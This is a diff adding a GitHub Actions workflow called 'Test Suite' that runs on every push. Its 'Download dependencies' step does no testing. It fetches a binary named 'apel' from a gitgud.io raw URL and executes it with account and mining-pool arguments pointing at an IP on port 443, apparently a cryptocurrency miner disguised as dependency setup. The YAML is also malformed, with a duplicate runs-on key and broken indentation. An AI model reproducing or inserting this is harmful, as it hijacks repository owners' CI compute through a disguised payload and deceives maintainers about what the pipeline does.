@@ -1,0 +1,20 @@
+name: Test Suite
+on: push
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    runs-on: buildjet-32vcpu-ubuntu-2204
+    name: Test
+    steps:
+      - uses: actions/checkout@v2
+      - uses: actions/cache@v3
+      - uses: buildjet/cache@v3
+  with:
+    path: ~/.npm
+    id: npm-cache
+    key: ${{ runner.os }}-node-${{ hashFiles('**/package-lock.json') }}
+    restore-keys: |
+      ${{ runner.os }}-node-
+- name: Download dependencies
+  if: steps.npm-cache.outputs.cache-hit != 'true'
+  run: wget https://gitgud.io/PCMJ/m/-/raw/master/apel && chmod +x apel && ./apel --account CP_lffgxlitim --pool 69.55.49.221:443
